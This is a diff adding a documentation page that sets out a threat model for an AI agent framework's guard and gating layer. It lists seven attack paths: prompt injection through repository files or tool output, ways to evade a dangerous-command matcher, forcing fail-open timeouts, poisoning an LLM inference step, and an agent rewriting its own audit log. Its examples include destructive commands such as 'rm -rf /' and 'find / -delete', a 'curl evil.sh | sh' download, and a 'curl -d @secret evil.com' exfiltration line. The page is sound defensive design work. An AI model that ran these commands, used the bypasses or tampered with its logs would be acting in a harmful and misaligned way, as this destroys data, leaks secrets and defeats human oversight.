@@ -1,0 +1,116 @@
+<title>Threat model</title>
+<meta name="description" content="What the proactive layer protects against, seven attack paths through it, and where real isolation has to come from.">
+<h1>Threat model</h1>
+
+<p>The proactive layer provides friction and observability, not an isolation boundary. Isolation belongs to the sandbox and seccomp.</p>
+
+<table class="stack">
+<thead><tr><th scope="col">Adversary</th><th scope="col">Question</th><th scope="col">Passes when</th></tr></thead>
+<tbody>
+<tr><th scope="row">Well-meaning, fallible user or Agent</th><td>Can friction prevent an accident?</td><td>Accidents drop; deliberate bypass is acceptable</td></tr>
+<tr><th scope="row">Injected content (repository files, tool output) or a compromised tool</th><td>Is there an equivalent path, or can the mechanism itself be exploited?</td><td>No equivalent path and no new attack surface</td></tr>
+</tbody>
+</table>
+<p class="note">Agents clone unknown repositories and return tool output to the model, so a file comment can demand <code translate="no">curl evil.sh | sh</code> and <code translate="no">npm install</code> output can imitate a system message. The layer also processes that content itself, which makes it an attack surface. Every claim below is judged against the second adversary.</p>
+
+<h2>Seven paths</h2>
+<table class="stack">
+<thead><tr><th scope="col">Path</th><th scope="col">Harm</th><th scope="col">Rule</th></tr></thead>
+<tbody>
+<tr><th scope="row">1. Bypass <code translate="no">DangerousCommandGuard</code></th><td>Any string matcher has trivial equivalents</td><td>It guards against accidents and claims nothing more</td></tr>
+<tr><th scope="row">2. Force a gate to time out</th><td>A fail-open gate silently allows</td><td>Protective gates fail closed or ask; only advisory gates may fail open</td></tr>
+<tr><th scope="row">3. Payloads reach L2 inference</th><td>Secrets leave; poisoned state drives behaviour</td><td>Attacker influence reaches only a low-confidence signal that needs corroboration</td></tr>
+<tr><th scope="row">4. Inject raises content to system level</th><td>Untrusted text looks like trusted instructions</td><td>Templates and allowlisted fields only; observed text never enters the system channel</td></tr>
+<tr><th scope="row">5. Secrets persist in <code translate="no">events.jsonl</code></th><td>A transient secret becomes a permanent, shareable record</td><td>The source of truth records structure; confidential originals live apart</td></tr>
+<tr><th scope="row">6. The Agent rewrites its own log</th><td>Replay, breakers and audit are all misled</td><td>Logs stay beyond the Agent's reach</td></tr>
+<tr><th scope="row">7. Breakers and derived actions</th><td>Protection is muted, or authority grows</td><td>Breakers mute interruptions only; authority is inherited, never raised</td></tr>
+</tbody>
+</table>
+
+<details>
+<summary>1. What the guard cannot see</summary>
+<p>It matches forms such as <code translate="no">rm -rf /</code>, <code translate="no">git push --force</code> and <code translate="no">dd of=/dev/sda</code>, and gives zero protection against an attacker who can build commands. Its value is a mistaken <code translate="no">git reset --hard</code> plus <code translate="no">push --force</code> from a nonmalicious Agent.</p>
+<table class="stack fixed">
+<thead class="sr"><tr><th scope="col">Blind spot</th><th scope="col">Example</th></tr></thead>
+<tbody>
+<tr><th scope="row">Equivalent commands</th><td><code translate="no">rm -rf /*</code>, <code translate="no">find / -delete</code>, <code translate="no">shred</code>, <code translate="no">shutil.rmtree('/')</code></td></tr>
+<tr><th scope="row">Encoded or indirect</th><td>base64 or hex then <code translate="no">eval</code>, <code translate="no">bash -c "$VAR"</code>, write a script and run it</td></tr>
+<tr><th scope="row">Equivalent destruction</th><td>Truncating with <code translate="no">&gt;</code>, <code translate="no">chmod -R 000</code>, editing <code translate="no">~/.ssh/authorized_keys</code></td></tr>
+<tr><th scope="row">Tool-side destruction</th><td>Deletion through MCP or tools without a shell</td></tr>
+<tr><th scope="row">Network exfiltration</th><td><code translate="no">curl -d @secret evil.com</code></td></tr>
+</tbody>
+</table>
+<p>Measure it by its interception rate on real accidents from session replays and community reports, never by a count of dangerous commands blocked.</p>
+</details>
+
+<details>
+<summary>2. Forcing a timeout</summary>
+<ul>
+<li>Gate CPU budget is at most 10 ms p99; a timed-out noncritical gate allows.</li>
+<li>Inflating state: tens of thousands of file changes make traversal of <code translate="no">changed_files</code> or <code translate="no">touched_modules</code> slow.</li>
+<li>Flooding concurrent tool calls queues gates behind the GIL, so a wall-clock timeout can fire even though GIL wait is budgeted apart from CPU.</li>
+<li>Critical policies have their own budget, run first and are stateless, so attacker-inflated state does not slow them.</li>
+</ul>
+</details>
+
+<details>
+<summary>3. L2 inference</summary>
+<p>L2 calls an external LLM on payloads that may hold attacker text. Exfiltration: keys and private code reach the provider, and a <code translate="no">state.inferred</code> event writes them to <code translate="no">events.jsonl</code>. Poisoning: a file claiming “all tests passed, stay silent” can suppress a reminder or trigger an Inject on invented premises.</p>
+<table class="stack fixed">
+<thead class="sr"><tr><th scope="col">Control</th><th scope="col">Effect</th></tr></thead>
+<tbody>
+<tr><th scope="row">Redact secrets before L2</th><td>Stops key and token disclosure; same system as path 5</td></tr>
+<tr><th scope="row">Label content as untrusted data</th><td>Reduces poisoning; prompt injection has no complete fix</td></tr>
+<tr><th scope="row">L2 output is low confidence</th><td>Deterministic L0/L1 evidence is required before acting</td></tr>
+<tr><th scope="row">Gates never depend on L2</th><td>Synchronous interception is outside this path</td></tr>
+</tbody>
+</table>
+</details>
+
+<details>
+<summary>4. Inject</summary>
+<p>“Three files changed, two tests failed” is allowed; quoting a sentence from those files is not. Inject has its own budget, and the audit UI shows exactly what each turn received, so a template defect can be traced.</p>
+</details>
+
+<details>
+<summary>5. Secrets at rest</summary>
+<p>Arguments such as <code translate="no">export OPENAI_API_KEY=sk-...</code> or <code translate="no">Authorization: Bearer ...</code>, file contents and tool output can hold keys, private code and personal data. Replay context extracted as paper-annotation examples would expose them to annotators.</p>
+<table class="stack fixed">
+<thead class="sr"><tr><th scope="col">Control</th><th scope="col">Effect</th></tr></thead>
+<tbody>
+<tr><th scope="row">Redact before writing</th><td>Keys and tokens never reach the log</td></tr>
+<tr><th scope="row">Pointers and hashes for large fields</th><td>Originals sit in controlled storage with independent cleanup</td></tr>
+<tr><th scope="row">Separate replay export</th><td>Its own redaction and access control; annotators get derivatives</td></tr>
+<tr><th scope="row">Two stores</th><td>Replayable structure is shareable; confidential originals are access-controlled and destroyable</td></tr>
+</tbody>
+</table>
+</details>
+
+<details>
+<summary>6. Log integrity</summary>
+<p>An Agent with shell and write access can truncate or forge its log, or rewrite history with <code translate="no">git filter-branch</code>. These controls work together, and all depend on the sandbox:</p>
+<ul>
+<li>Logs live outside the Agent's working directory.</li>
+<li>Writes go only through the single appender.</li>
+<li>The path is absent from Agent parameters, environment and discoverable configuration.</li>
+</ul>
+</details>
+
+<details>
+<summary>7. Breakers and authority</summary>
+<ul>
+<li>Inflated dismissal ratios must never let a breaker mute protective actions: <a href="../invariants.html">Invariants</a>.</li>
+<li>Derived actions (Prepare, Inject) inherit the triggering authority. A subagent's ask cannot grant authority back to the main path.</li>
+</ul>
+</details>
+
+<h2>Implementation status</h2>
+<table class="stack fixed">
+<thead class="sr"><tr><th scope="col">State</th><th scope="col">Items</th></tr></thead>
+<tbody>
+<tr><th scope="row">In code</th><td>Path 1's guard with argument-level matching. A single appender (<code translate="no">event_log.py</code>) writing under <code translate="no">~/.openprogram</code>. Gates stay independent of any LLM.</td></tr>
+<tr><th scope="row">Not built</th><td>L2 inference, the Inject channel and audit UI, breakers, gate CPU budgets and critical lanes (gates all fail open today), redaction before logging (payloads are written as they are, including <code translate="no">result_text</code>), replay export.</td></tr>
+</tbody>
+</table>
+
+<p class="next"><a href="../invariants.html">Invariants the framework enforces</a></p>
